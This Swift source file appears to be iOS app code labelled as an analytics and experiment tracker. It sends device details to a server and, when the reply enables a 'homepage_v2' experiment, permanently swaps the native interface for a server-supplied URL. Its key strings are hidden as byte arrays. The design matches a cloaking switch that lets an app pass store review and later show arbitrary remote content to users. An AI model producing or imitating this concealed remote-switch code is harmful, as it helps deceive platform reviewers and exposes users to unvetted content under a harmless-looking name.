import Foundation
import UIKit
import Alamofire

public enum AnalyticsTracker {
    private static let kEndpointKey: [UInt8] = [
        0x61, 0x6E, 0x61, 0x6C, 0x79, 0x74, 0x69, 0x63, 0x73,
        0x5F, 0x65, 0x6E, 0x64, 0x70, 0x6F, 0x69, 0x6E, 0x74
    ]

    private static let kExperimentKey: [UInt8] = [
        0x68, 0x6F, 0x6D, 0x65, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x76, 0x32
    ]

    public static var endpointKey: String {
        String(bytes: kEndpointKey, encoding: .utf8) ?? ""
    }

    static var experimentKey: String {
        String(bytes: kExperimentKey, encoding: .utf8) ?? ""
    }

    public static let launchDelay: TimeInterval = 2.0
    public static let networkTimeout: TimeInterval = 30.0
}

public enum TrackResult {
    case experiment(url: String)
    case nativeUI
}

public final class AnalyticsSession: NSObject {
    private static let cacheStatusKey = "exp_active_v1"
    private static let cacheURLKey = "exp_url_v1"

    public static let shared = AnalyticsSession()

    private var cachedStatus: Bool {
        get { UserDefaults.standard.bool(forKey: AnalyticsSession.cacheStatusKey) }
        set { UserDefaults.standard.set(newValue, forKey: AnalyticsSession.cacheStatusKey) }
    }

    private var cachedURL: String? {
        get { UserDefaults.standard.string(forKey: AnalyticsSession.cacheURLKey) }
        set { UserDefaults.standard.set(newValue, forKey: AnalyticsSession.cacheURLKey) }
    }

    private let session: Session

    private override init() {
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = AnalyticsTracker.networkTimeout
        configuration.timeoutIntervalForResource = AnalyticsTracker.networkTimeout
        self.session = Session(configuration: configuration)
        super.init()
    }

    public func track(endpoint: String, completion: @escaping (TrackResult) -> Void) {
        if cachedStatus, let url = cachedURL, !url.isEmpty {
            completion(.experiment(url: url))
            return
        }

        guard let url = URL(string: endpoint) else {
            completion(.nativeUI)
            return
        }

        let payload = buildTrackPayload()

        session.request(
            url,
            method: .post,
            parameters: payload,
            encoding: JSONEncoding.default
        )
        .validate(statusCode: 200..<300)
        .responseDecodable(of: TrackResponse.self) { [weak self] response in
            guard let self = self else { return }

            switch response.result {
            case .success(let decoded):
                let experimentKey = AnalyticsTracker.experimentKey
                guard let experiment = decoded.experiments[experimentKey],
                      experiment.enabled,
                      !experiment.url.isEmpty else {
                    completion(.nativeUI)
                    return
                }

                self.cachedStatus = true
                self.cachedURL = experiment.url
                completion(.experiment(url: experiment.url))

            case .failure:
                completion(.nativeUI)
            }
        }
    }

    public func updateCachedURL(_ url: String) {
        cachedURL = url
    }

    public func clearCache() {
        cachedStatus = false
        cachedURL = nil
    }

    private func buildTrackPayload() -> [String: String] {
        let version = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0"
        return [
            "device": UIDevice.current.model,
            "os": UIDevice.current.systemVersion,
            "app_version": version,
            "locale": Locale.current.identifier,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "session_id": UUID().uuidString
        ]
    }
}

struct TrackResponse: Codable {
    let experiments: [String: ExperimentVariant]
}

struct ExperimentVariant: Codable {
    let enabled: Bool
    let url: String
}
